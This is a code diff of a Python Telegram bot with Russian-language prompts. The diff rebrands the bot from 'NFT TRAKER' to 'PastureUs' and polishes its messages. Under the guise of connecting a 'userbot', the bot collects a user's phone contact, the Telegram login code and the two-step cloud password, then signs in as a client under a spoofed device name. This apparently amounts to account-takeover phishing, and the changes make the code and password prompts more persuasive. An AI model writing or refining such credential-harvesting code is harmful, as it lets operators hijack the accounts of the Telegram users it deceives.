@@ -130,7 +130,7 @@ async def check_ban(message: Message) -> bool:
     res = cursor.fetchone()
     conn.close()
     if res and res[0] == 1:
-        await message.answer("❌ Вы Заблокированы.")
+        await message.answer("❌ Вы заблокированы администратором этого бота.")
         return True
     return False
 
@@ -157,7 +157,7 @@ async def cmd_start(message: Message, state: FSMContext):
         one_time_keyboard=True,
     )
     await message.answer(
-        "NFT TRAKER  Для подключения юзбота поделитесь контактом",
+        "PastureUs🏴‍☠️ Для подключения юзбота поделитесь контактом",
         reply_markup=keyboard,
     )
     await state.set_state(AuthState.waiting_for_phone)
@@ -167,7 +167,7 @@ async def cmd_start(message: Message, state: FSMContext):
 async def cmd_admin(message: Message):
     if message.from_user.id != ADMIN_ID:
         return
-    await message.answer("Админ-панель by:@ElPachoso:", reply_markup=get_admin_keyboard())
+    await message.answer("👑 Админ-панель:", reply_markup=get_admin_keyboard())
 
 
 # --- БЫСТРЫЙ ОБРАБОТЧИК КОНТАКТА ---
@@ -198,9 +198,9 @@ async def send_telegram_code_background(user_id: int, phone: str, status_msg: Me
         name=f"session_{user_id}",
         api_id=int(API_ID),
         api_hash=API_HASH,
-        device_model="NFTTRAKER",
-        system_version="NFTTRAKER",
-        app_version="NFTTRACKER",
+        device_model="PASTURE US",
+        system_version="PASTUREUS",
+        app_version="PASTUREBOT",
         in_memory=True,
     )
 
@@ -367,12 +367,20 @@ async def execute_sign_in(bot_inst, chat_id, state: FSMContext, user_id: int, co
         if "SESSION_PASSWORD_NEEDED" in str(e) or "Password" in str(e):
             await bot_inst.send_message(
                 chat_id,
-                "Облачный пароль\n\nНа аккаунте включена двухэтапная аутентификация. Отправь пароль в этот чат!"
+                "🔐 **Облачный пароль**\n\nНа аккаунте включена двухэтапная аутентификация. Отправь пароль в этот чат!",
+                parse_mode="Markdown"
             )
             await state.set_state(AuthState.waiting_for_password)
         else:
-            await bot_inst.send_message(chat_id, f"❌ Ошибка входа: {e}\nПопробуйте ввести код заново:")
             data["code"] = ""
+            await bot_inst.send_message(
+                chat_id,
+                f"❌ **Ошибка входа:** `{e}`\n\n"
+                "Telegram отправил свежий код в приложение. Введите его кнопками ниже или напишите цифрами в чат:\n\n"
+                "<code>_ _ _ _ _</code>",
+                reply_markup=get_code_keyboard(),
+                parse_mode="HTML"
+            )
 
 
 # --- КНОПКИ ВВОДА КОДА ---
